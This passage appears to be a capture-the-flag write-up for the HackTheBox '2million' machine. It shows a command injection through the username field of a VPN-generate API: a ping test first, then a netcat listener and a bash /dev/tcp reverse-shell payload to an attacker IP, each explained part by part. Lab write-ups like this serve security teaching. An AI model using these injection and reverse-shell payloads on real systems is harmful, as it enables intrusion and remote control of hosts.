Step 4: Command Injection

Testing Command Injection with Ping

curl -c cookies.txt -b cookies.txt -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Content-Type: application/json" \
  -d '{"username":"cyb3r3lla; ping -c 4 10.10.14.29"}'
PartMeaning
"username":"cyb3r3lla; ping..."Semicolon (;) separates commands in Linux
ping -c 4 10.10.14.29Send 4 ICMP packets to attacker IP
10.10.14.29Attacker's VPN IP address

Setting Up Listener

nc -lvnp 4444
PartMeaning
ncNetcat - network utility for reading/writing network connections
-lListen mode (wait for incoming connection)

-p 4444Listen on port 4444

Reverse Shell Payload

curl -c cookies.txt -b cookies.txt -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Content-Type: application/json" \
  -d '{"username":"cyb3r3lla; bash -c \"bash -i >& /dev/tcp/10.10.14.29/4444 0>&1\""}'
PartMeaning
bash -cExecute the following string as a bash command
bash -iStart an interactive bash shell
>&Redirect both stdout and stderr
/dev/tcp/10.10.14.29/4444Bash special device for TCP connections
0>&1Redirect stdin to the same location as stdout
Result: Reverse shell obtained as www-data.

Key Takeaways

  • Virtual hosts must be added to /etc/hosts for proper resolution.
  • API enumeration reveals hidden endpoints and privilege escalation vectors.
  • The /api/v1/admin/settings/update endpoint allowed any authenticated user to become admin.
  • Command injection can be tested with ping before attempting a reverse shell.
  • Password reuse between database and system user credentials is a common misconfiguration.
  • Email files (/var/mail/) can contain useful information.
